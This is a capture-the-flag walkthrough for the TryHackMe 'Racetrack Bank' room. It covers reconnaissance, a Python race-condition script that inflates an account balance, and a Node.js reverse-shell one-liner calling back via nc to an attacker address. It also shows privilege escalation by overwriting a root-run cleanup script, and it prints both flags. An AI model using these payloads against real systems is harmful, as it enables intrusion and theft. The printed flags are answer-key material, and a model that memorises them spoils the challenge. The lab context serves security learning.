<h1 align="center">Racetrack Bank</h1>
<p align="center">2025, August 10<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>461</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>It's time for another heist</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/2c916675-c06b-44ef-959f-681d4ece93ca"><br>
Access the CTF<a href="https://tryhackme.com/room/4th3n4">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/f18e02e5-c1be-4cbf-8530-5c80411df08a"></p>

<br>

<h2>Task 1 .Flags</h2>
<p>Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>nmap</h3>

```bash
:~/RacetrackBank# nmap -sC -sV -Pn -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)
|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)
|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Racetrack Bank
```

<br>

<h3>gobuster</h3>

```bash
:~/RacetrackBank# gobuster dir -u http://TargetIP/ -w /usr/share/dirb/wordlists/common.txt -t 60 -x php,html,txt
...
/create.html          (Status: 200) [Size: 1973]
/Home.html            (Status: 302) [Size: 33] [--> /login.html]
/home.html            (Status: 302) [Size: 33] [--> /login.html]
/images               (Status: 301) [Size: 179] [--> /images/]
/Images               (Status: 301) [Size: 179] [--> /Images/]
/index.html           (Status: 200) [Size: 1542]
/Index.html           (Status: 200) [Size: 1542]
/index.html           (Status: 200) [Size: 1542]
/Login.html           (Status: 200) [Size: 1815]
/login.html           (Status: 200) [Size: 1815]
/purchase.html        (Status: 302) [Size: 33] [--> /login.html]
```

<br>
<h3>/home.html | /login.html</h3>

<p>

- <code>/api/login</code><br>
- <code>POST</code><br>
- <code>Create Account</p>

<img width="1054" height="354" alt="image" src="https://github.com/user-attachments/assets/b49579ac-0469-4fe8-8d38-c0ffd4c9761f" />

<img width="1051" height="133" alt="image" src="https://github.com/user-attachments/assets/7c91c3ec-a155-4b03-8305-bb70b9db54a1" />

<br>
<h3>Account A | create</h3>

<img width="1019" height="354" alt="image" src="https://github.com/user-attachments/assets/61deb176-b3f1-462c-b975-3172abfa63a1" />

<p><em>Request</em></p>

```bash
POST /api/create HTTP/1.1
...
Referer: http://xx.xxx.xx.xxx/create.html
Cookie: connect.sid=s%3A2psFbVFzhIOPZrGnIojD58MyJCnGGVBR.HKQMbO3jmcJsFAKCb5Q%2FjGXeWTW9q8hoeHbtSQiTKl4; connect.sid=s%3AnsFjYm7ZHtZHO43xY6OnbXTK3p9qLdok.u4cYFPQzEz6oc8zWPiecflzH1vMo9ygKGyHgM%2Bsnxag
...
username=A&password=password&password2=password
```

<p><em>Response</em></p>

```bash
HTTP/1.1 302 Found
...
Location: /login.html
Vary: Accept

<p>Found. Redirecting to <a href="/login.html">/login.html</a></p>
```

<br>
<br>
<br>

<p><em>Request</em></p>

```bash
GET /login.html HTTP/1.1
...
Referer: http://xx.xxx.xx.xxx/create.html
Cookie: connect.sid=s%3A2psFbVFzhIOPZrGnIojD58MyJCnGGVBR.HKQMbO3jmcJsFAKCb5Q%2FjGXeWTW9q8hoeHbtSQiTKl4; connect.sid=s%3AnsFjYm7ZHtZHO43xY6OnbXTK3p9qLdok.u4cYFPQzEz6oc8zWPiecflzH1vMo9ygKGyHgM%2Bsnxag
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
```

<br>
<h3>Account A | login</h3>

<p><em>Request</em></p>

```bash
POST /api/login HTTP/1.1
...
Referer: http://xx.xxx.xx.xxx/login.html
Cookie: connect.sid=s%3A2psFbVFzhIOPZrGnIojD58MyJCnGGVBR.HKQMbO3jmcJsFAKCb5Q%2FjGXeWTW9q8hoeHbtSQiTKl4; connect.sid=s%3AnsFjYm7ZHtZHO43xY6OnbXTK3p9qLdok.u4cYFPQzEz6oc8zWPiecflzH1vMo9ygKGyHgM%2Bsnxag
...
username=A&password=password
```

<p><em>Response</em></p>

```bash
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
...
Location: /home.html
Vary: Accept

<p>Found. Redirecting to <a href="/home.html">/home.html</a></p>
```

<br>
<br>
<br>

<p><em>Request</em></p>

```bash
GET /home.html HTTP/1.1
...
Referer: http://xx.xxx.xx.xxx/create.html
Cookie: connect.sid=s%3A2psFbVFzhIOPZrGnIojD58MyJCnGGVBR.HKQMbO3jmcJsFAKCb5Q%2FjGXeWTW9q8hoeHbtSQiTKl4; connect.sid=s%3AnsFjYm7ZHtZHO43xY6OnbXTK3p9qLdok.u4cYFPQzEz6oc8zWPiecflzH1vMo9ygKGyHgM%2Bsnxag
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
...
                    <a class="nav-link">
                        Gold: 1
...
<li class="nav-item">
                            <a class="nav-link" href="/giving.html">Give Gold
...

Welcome to Racetrack Bank! To get you started, we have given you 1 gold (how generous of us!). Spend it wisely.
```

<br>
<h3>home.html</h3>

<img width="1055" height="176" alt="image" src="https://github.com/user-attachments/assets/190cdac1-e43e-4080-89db-e99ce6b8afc5" />


<br>
<h3>/giving.html</h3>

<img width="1063" height="180" alt="image" src="https://github.com/user-attachments/assets/c8057736-101b-4e65-a885-154c77f67180" />

<br>
<h3>/purchase.html</h3>

<img width="1054" height="235" alt="image" src="https://github.com/user-attachments/assets/7e6280ae-5a2b-4c69-aa85-1ef3ff26f977" />

<br>
<h3>Target | Site map</h3>
<p>

- <code>givegold</code></p>

<img width="342" height="240" alt="image" src="https://github.com/user-attachments/assets/bcf22577-2607-4b93-be57-d7d5daac5118" />


<br>
<h3>Account B | login</h3>

<img width="1053" height="213" alt="image" src="https://github.com/user-attachments/assets/7b98d762-7c00-4f0a-8ddf-575aead22cfd" />


<br>
<h3>1 gold from <code>A</code> to <code>B</code></h3>

<img width="1057" height="62" alt="image" src="https://github.com/user-attachments/assets/77f2b70d-28a9-4fd5-b9cc-86aeb9eaa23b" />


<br>
<br>
<br>

<p><em>Request</em></p>

```bash
POST /api/givegold HTTP/1.1
...
Referer: http://xx.xxx.xx.xxx/giving.html
Cookie: connect.sid=s%3AOvUOCrSsiMj6YQxzQkKZyfbPB1cSycQ-.9tVHrDSV3pwPzn2Ya%2F9tchJ2P55rdxrp3JlLIX%2B4yLU; connect.sid=s%3AnsFjYm7ZHtZHO43xY6OnbXTK3p9qLdok.u4cYFPQzEz6oc8zWPiecflzH1vMo9ygKGyHgM%2Bsnxag
...
user=B&amount=1
```

<p><em>Response</em></p>

```bash
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
...
Location: /giving.html?success=Success!
Vary: Accept

<p>Found. Redirecting to <a href="/giving.html?success=Success!">/giving.html?success=Success!</a></p>
```

<br>
<b3>Racetrack</b3>

<img width="719" height="169" alt="image" src="https://github.com/user-attachments/assets/cc13cf57-ae97-436a-b27f-6c7df7303457" />

<br>
<h3> <code>B</code> giving gold to <code>A</code></h3>

```bash
:~/RacetrackBank# wfuzz -w file.txt -u http://xx.xxx.xx.xxx/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AjJJcJn8bwRUTYagaTGb2IIgQhu-la_8o.4Of9dwlKdtVTJt%2FGGNx6CQvrwWenjbZBOp6SB8a46Fk" -d "user=A&amount=FUZZ"
 ```

<img width="1054" height="182" alt="image" src="https://github.com/user-attachments/assets/fab14992-f97b-4878-ab57-b3a31ff27e95" />

<img width="950" height="388" alt="image" src="https://github.com/user-attachments/assets/5f51bee0-9bf3-4896-a25f-0cdbb4e0bab8" />


<p>

- Got enough <code>gold</code> with <strong>Baris Dincer</strong>´s script</p>

<br>
<h3><code>script</code></h3>

<p><em>script.py</em></p>

```bash
import grequests
import requests
from bs4 import BeautifulSoup

ip_address = "xx.xxx.xx.xxx"

user_main = "B"
pass_main = "password"
user_add =  "A"
pass_add =  "password"

def user_gold_and_cookie(username, password):
    payload = {
        'username': username,
        'password': password
    }
    with requests.Session() as session:
        response = session.post(f'http://{ip_address}/api/login', data=payload)
        soup = BeautifulSoup(response.text, "html.parser")
        gold_amount = 0
        for tag in soup.find_all('a'):
            if "Gold:" in tag.text:
                gold_amount = int(tag.text.split(":", 1)[1].strip())
                cookie_dict = session.cookies.get_dict()
        return cookie_dict['connect.sid'], gold_amount

def send_gold(user, cookie, amount):
    url = f'http://{ip_address}/api/givegold'
    headers = {
        "Host": ip_address,
        "Referer": f'http://{ip_address}/giving.html',
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Cookie": f"connect.sid={cookie}",
        "Upgrade-Insecure-Requests": "1"
    }
    cookies = {
        "connect.sid": cookie
    }
    data = f"user={user}&amount={amount}"
    rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for _ in range(100))
    responses = grequests.map(rs)
    print(f"{amount} gold has been sent to user {user}!")

def main():
    gold_needed = 0
    counter = 1
    while gold_needed < 10000:
        if counter % 2 == 0:
            print(f"{user_main}'s turn to send gold...")
            cookie, gold_needed = user_gold_and_cookie(user_main, pass_main)
            send_gold(user_add, cookie, gold_needed)
        else:
            print(f"{user_add}'s turn to send gold...")
            cookie, gold_needed = user_gold_and_cookie(user_add, pass_add)
            send_gold(user_main, cookie, gold_needed)
        counter += 1

if __name__ == "__main__":
    main()
 ```

<br>

```bash
:~/RacetrackBank# python3 script.py
 ```

<br>

<br>
<h3>Purchase</h3>

<img width="1400" height="419" alt="image" src="https://github.com/user-attachments/assets/13059f01-e943-471a-a44d-4aaf29a9d4fa" />


<br>
<h3>Premium Features</h3>

<img width="1409" height="456" alt="image" src="https://github.com/user-attachments/assets/3b0dd57c-3d14-42ba-b521-179bcf053779" />

<br>
<h3>process.cwd()</h3>

<img width="1401" height="489" alt="image" src="https://github.com/user-attachments/assets/d0b44b32-ebfe-4c5e-a7bd-53f839dde54e" />

<br>
<h3>Reverse Shell</h3>

```bash
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xxx.xxx 9001 >/tmp/f')
```

```bash
:~/RacetrackBank# nc -nvlp 9001
...
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
brian@racetrack:~/website$ ^Z
[1]+  Stopped                 nc -nvlp 9001
:~/RacetrackBank# stty -echo raw;fg
nc -nvlp 9001

brian@racetrack:~/website$ export TERM=xterm
brian@racetrack:~/website$ cd /home
brian@racetrack:~$ ls -lah
total 76K
drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 .
drwxr-xr-x  3 root  root  4.0K Apr 22  2020 ..
drwxrwxr-x  3 root  root  4.0K Apr 23  2020 admin
-rw-r--r--  1 brian brian  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 brian brian 3.7K Apr  4  2018 .bashrc
drwx------  2 brian brian 4.0K Apr 22  2020 .cache
drwxr-xr-x  2 brian brian 4.0K Apr 23  2020 cleanup
drwx------  3 brian brian 4.0K Apr 22  2020 .config
drwx------  3 brian brian 4.0K Apr 22  2020 .gnupg
-rw-------  1 brian brian    0 Apr 22  2020 .node_repl_history
drwxrwxr-x  5 brian brian 4.0K Apr 22  2020 .npm
drwxrwxr-x  5 brian brian 4.0K Aug 10 19:08 .pm2
-rw-r--r--  1 brian brian  807 Apr  4  2018 .profile
-rw-rw-r--  1 brian brian   39 Apr 23  2020 user.txt
drwxr-xr-x  2 brian brian 4.0K Apr 22  2020 .vim
-rw-------  1 root  root   15K Apr 22  2020 .viminfo
drwxrwxr-x  6 brian brian 4.0K Apr 22  2020 website
brian@racetrack:~$ ls
admin  cleanup  user.txt  website
brian@racetrack:~$ cat user.txt
THM{178c31090a7e0f69560730ad21d90e70}

brian@racetrack:~$ 
```


<br>

<p>1.1. User flag<br>
<code>THM{178c31090a7e0f69560730ad21d90e70}</code></p>

<br>

<br>

```bash
brian@racetrack:~$ cd admin
brian@racetrack:~/admin$ ls
accounts  manageaccounts
brian@racetrack:~/admin$ cd accounts
brian@racetrack:~/admin/accounts$ ls
ben.account  charles.account  elise.account
```


```bash
brian@racetrack:~/admin/accounts$ cat ben.account
a
Ben is our best customer.
9999
brian@racetrack:~/admin/accounts$ cat charles.account
u
Everyone likes charles.
16
brian@racetrack:~/admin/accounts$ cat elise.account
u
Elise is also a good customer.
400
```

```bash
rian@racetrack:~/admin$ find / -perm -4000 -user root -type f 2>/dev/null
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/snap/core/8935/bin/mount
/snap/core/8935/bin/ping
/snap/core/8935/bin/ping6
/snap/core/8935/bin/su
/snap/core/8935/bin/umount
/snap/core/8935/usr/bin/chfn
/snap/core/8935/usr/bin/chsh
/snap/core/8935/usr/bin/gpasswd
/snap/core/8935/usr/bin/newgrp
/snap/core/8935/usr/bin/passwd
/snap/core/8935/usr/bin/sudo
/snap/core/8935/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8935/usr/lib/openssh/ssh-keysign
/snap/core/8935/usr/lib/snapd/snap-confine
/snap/core/8935/usr/sbin/pppd
/home/brian/admin/manageaccounts
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

<p><code>/home/brian/admin/manageaccounts</code></p>

```bash
brian@racetrack:~/admin$ file /home/brian/admin/manageaccounts
/home/brian/admin/manageaccounts: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d5ed0e2c2d72ff6ac45e41e85444b76de6b3cdf3, not stripped
```

```bash
brian@racetrack:~/cleanup$ pwd
/home/brian/cleanup
brian@racetrack:~/cleanup$ ls -lah
total 12K
drwxr-xr-x  2 brian brian 4.0K Apr 23  2020 .
drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh
brian@racetrack:~/cleanup$ mv cleanupscript.sh cleanupscript.bak
brian@racetrack:~/cleanup$echo cho 'cat /root/root.txt > /home/brian/FLAG.txt' > cleanupscript.sh
brian@racetrack:~/cleanup$ chmod +x cleanupscript.sh
```


```bash
brian@racetrack:~/cleanup$ ls -lah
total 16K
drwxr-xr-x  2 brian brian 4.0K Aug 10 xx:xx .
drwxr-xr-x 11 brian brian 4.0K Aug 10 xx:xx ..
-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.bak
-rwxr-xr-x  1 brian brian   42 Aug 10 xx:xx cleanupscript.sh
brian@racetrack:~/cleanup$ cd ..
brian@racetrack:~$ ls
admin  cleanup  FLAG.txt  user.txt  website
brian@racetrack:~$ cat FLAG.txt
THM{55a9d6099933f6c456ccb2711b8766e3}

brian@racetrack:~$ 
```


<img width="1688" height="283" alt="image" src="https://github.com/user-attachments/assets/506d0eea-8482-4ca1-87b3-8ead7f551b74" />

<br>

<p>1.1. User flag<br>
<code>THM{55a9d6099933f6c456ccb2711b8766e3}</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/aea15486-d65c-45cc-bf6b-a008f4527b1e"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/92aa96cf-fb0b-45b9-97b1-1b5d808f09dc"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 10   |   461    |     126ᵗʰ    |      5ᵗʰ     |     314ᵗʰ   |     6ᵗʰ    | 120,414  |    908    |    73     |


</div>


<p align="center">Global All Time:   126ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/7d5a2530-1782-4288-be88-d50b4201804d"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/aa80c332-a909-4027-8c69-94d5726b1c62"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/0e8eaf12-b93f-43e4-8d2c-2fc0a476f2eb"><br>
                  Global monthly:    314ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/53ca84e6-69b2-43fb-976d-5da7b4bd8bad"><br>
                  Brazil monthly:      6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f08df8b6-afda-4087-b265-9249ca0afd1d"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
